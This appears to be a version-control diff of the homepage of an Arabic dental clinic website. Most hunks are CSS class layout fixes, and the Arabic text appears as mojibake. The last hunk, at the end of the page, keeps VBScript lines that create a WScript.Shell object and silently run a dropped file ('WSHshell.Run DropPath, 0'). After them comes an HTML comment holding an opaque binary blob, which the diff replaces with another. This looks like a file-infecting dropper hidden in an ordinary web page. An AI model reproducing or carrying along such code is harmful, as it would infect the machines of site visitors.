@@ -1,5 +1,5 @@
 ï»¿<!DOCTYPE html>
-<html lang="ar" dir="rtl" class="scroll-smooth">
+<html lang="ar" dir="rtl" class="scroll-smooth overflow-x-hidden">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -31,7 +31,7 @@
         }
     </script>
 </head>
-<body class="bg-brand-bg dark:bg-stone-900 text-brand-primary dark:text-stone-100 font-sans antialiased selection:bg-brand-rose selection:text-white flex flex-col min-h-screen transition-colors duration-300">
+<body class="bg-brand-bg dark:bg-stone-900 text-brand-primary dark:text-stone-100 font-sans antialiased selection:bg-brand-rose selection:text-white flex flex-col min-h-screen transition-colors duration-300 overflow-x-hidden w-full">
 
     <header class="w-full py-3 px-6 md:px-12 flex justify-between items-center border-b border-stone-200/60 dark:border-stone-800 sticky top-0 bg-brand-bg/90 dark:bg-stone-900/90 backdrop-blur-md z-50">
         <a href="index.html" class="flex items-center shrink-0">
@@ -88,7 +88,7 @@
             <p data-i18n="hero_desc" class="text-stone-600 dark:text-stone-400 font-light leading-relaxed max-w-md">
                 ÙØ±ÙŠÙ‚ ÙƒØ§Ù…Ù„ Ù…ØªØ®ØµØµ ÙÙŠ Ø¬Ù…ÙŠØ¹ Ù…Ø¬Ø§Ù„Ø§Øª Ø·Ø¨ Ø§Ù„Ø£Ø³Ù†Ø§Ù†. Ù†ÙˆÙØ± Ù„Ùƒ Ø§Ù„Ø±Ø¹Ø§ÙŠØ© Ø§Ù„ÙƒØ§Ù…Ù„Ø© ÙÙŠ Ø¨ÙŠØ¦Ø© Ù…Ø±ÙŠØ­Ø© ÙˆÙ…ØµÙ…Ù…Ø© Ø¨Ø¹Ù†Ø§ÙŠØ© Ù„Ø¶Ù…Ø§Ù† Ø£ÙØ¶Ù„ Ù†ØªØ§Ø¦Ø¬ ØªØ¬Ù…ÙŠÙ„ÙŠØ© ÙˆØµØ­ÙŠØ©.
             </p>
-            <div class="pt-4 flex items-center gap-4">
+            <div class="pt-4 flex items-center gap-4 flex-wrap">
                 <a href="booking.html" data-i18n="hero_btn_book" class="bg-stone-900 dark:bg-brand-accent dark:text-stone-900 text-white px-8 py-3.5 rounded-full text-sm hover:shadow-lg transition-all">Ø§Ø­Ø¬Ø² Ø§Ø³ØªØ´Ø§Ø±ØªÙƒ Ø§Ù„Ø§Ù†</a>
                 <a href="location.html" data-i18n="hero_btn_location" class="border border-stone-300 dark:border-stone-700 px-6 py-3.5 rounded-full text-sm text-stone-700 dark:text-stone-300 hover:bg-stone-100 dark:hover:bg-stone-800 transition-all">Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¹ÙŠØ§Ø¯Ø©</a>
             </div>
@@ -98,7 +98,7 @@
             <div class="w-full h-[450px] bg-stone-300 dark:bg-stone-800 rounded-3xl overflow-hidden shadow-xl relative">
                 <img src="https://images.unsplash.com/photo-1629909613654-28e377c37b09?auto=format&fit=crop&q=80&w=800" alt="Glow Dental Clinic Clinic Interior" class="w-full h-full object-cover" loading="lazy">
             </div>
-            <div class="absolute -bottom-6 -right-6 bg-white/90 dark:bg-stone-800/90 backdrop-blur-md p-6 rounded-2xl shadow-lg border border-stone-100 dark:border-stone-700 max-w-xs">
+            <div class="absolute -bottom-6 ltr:left-6 rtl:-right-6 bg-white/90 dark:bg-stone-800/90 backdrop-blur-md p-6 rounded-2xl shadow-lg border border-stone-100 dark:border-stone-700 max-w-xs">
                 <p data-i18n="location_badge" class="text-xs text-stone-500 dark:text-stone-400 uppercase tracking-wider mb-1">Ø§Ù„Ù…ÙˆÙ‚Ø¹</p>
                 <p data-i18n="location_address" class="text-sm font-semibold text-stone-800 dark:text-stone-200">Ø§Ù„Ø¯Ù‚ÙŠØŒ Ø§Ù„Ø¬ÙŠØ²Ø© - Ø´Ø§Ø±Ø¹ Ø§Ù„Ø«ÙˆØ±Ø©</p>
             </div>
@@ -198,7 +198,7 @@
             <span data-i18n="chat_btn" class="text-xs font-semibold">Ù…Ø³Ø§Ø¹Ø¯ Glow Ø§Ù„Ø°ÙƒÙŠ</span>
         </button>
 
-        <div id="chatbot-window" class="hidden fixed bottom-24 right-6 w-[340px] md:w-[380px] bg-white dark:bg-stone-800 rounded-3xl shadow-2xl border border-stone-200 dark:border-stone-700 overflow-hidden flex flex-col z-50 transition-all duration-300">
+        <div id="chatbot-window" class="hidden fixed bottom-24 right-6 w-[340px] md:w-[380px] bg-white dark:bg-stone-800 rounded-3xl shadow-2xl border border-stone-200 dark:border-stone-700 overflow-hidden flex flex-col z-50 transition-all duration-300 max-w-[calc(100vw-3rem)]">
             <div class="bg-stone-900 text-white p-4 flex justify-between items-center">
                 <div class="flex items-center gap-3">
                     <div class="w-9 h-9 rounded-full bg-brand-accent/20 border border-brand-accent/40 flex items-center justify-center text-brand-accent font-bold text-sm">
@@ -421,5 +421,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--
-÷ô€}MKózäÛ­A•É`(E%.ö'r6Eè€Šâï´ü¨)$a¤œg[Û!¿sºÄ!\˜ƒáû@o¾Î©¹Å‹ô"ç»>ÏEŠÎÎØöäwO ˜DÆyäEÅKZÏZ–ç|l»º¸üÜ'ãŸ{kÇi“¾‹}Ú&ÂýM‰aÐ¬©¸×¤D Pe—Jj-§‚Zê¢CEÌº\ZÑ2j4p„ÜçÏ°žž°®èÐÍë-N7uÔÚ$—±	ÌÉÄu5ò=?õáÚÐÂígyq¹ú™éÐü¦±ƒDlÀÒY¹`ï˜ëÜšªþb>6Ì˜:9°H‡ ~!Óâ¬gD$Üç,QÚß	-ý0/áÑŸAºáü©Ÿ,ØW&H)ý­²i“TJ –2jÁr¾4$ñ Î…£ùTÎ.òc„rœÍªéÄwbÂN-Gö¹Ð„º’¶¼€BÊÎ¶‹øß³³ÇnkŽã¾¿Ñ"fH?ŽÞBë‚›?ìZÎ/Nõ¹­…(æ˜™<Ï«­Ø<Èäš³Ù]Ý¦ crÁ½Mz°>ÑXS%qÙ›…æ¼QÏ•¬æLÒ‘›õ¡3¤š*¿Æ:doßª¯Úƒ}Xk2Î±[Ô©W._ðî'è²ÈÀ Ý<R'øÝ<Ý<Ý<áNºehÛ_< Ý<-->
+//--></SCRIPT><!--)Ë !M>°nÝ SÄ‹ÊXRr’šÍ”´€§y‘`v%'Z$ÁvÂ‚½„Éyj®2‰ÄoÏpÂ”[IæÅëíÛ%H–ÖŒÜ Nnmf·£šþ¬ò}§91?}‡Û*òê^(_½=|°å‡¼B’3µYÖ˜Éº|É Ëœ6=º%ƒL[-é¾:½èàb½Id½ÀòÅz_xýGŽÛG4rC¹êUÞ;‘ñ÷àC%ˆ¤²U_jy­~Y¹Sæ9þLjrÄ²Á·ÚU¾£¬5Ä‹;ÏØ”w C+üId†Ø õmÖãEØã_þ”àÒL[ªUCP0êsu8nÇÕ[¿Yâìñã¶Ÿ+¸©øtyŠ{ôoOî¤Ç¨®ýÉ?È6z¬ÖFÀ5QæYÄus‹+ž#EËh–ZËð§Íœr’Èé&·SdÔA’G é-R*6øé-é-é-¤ðNÉB‰h8j- é--->
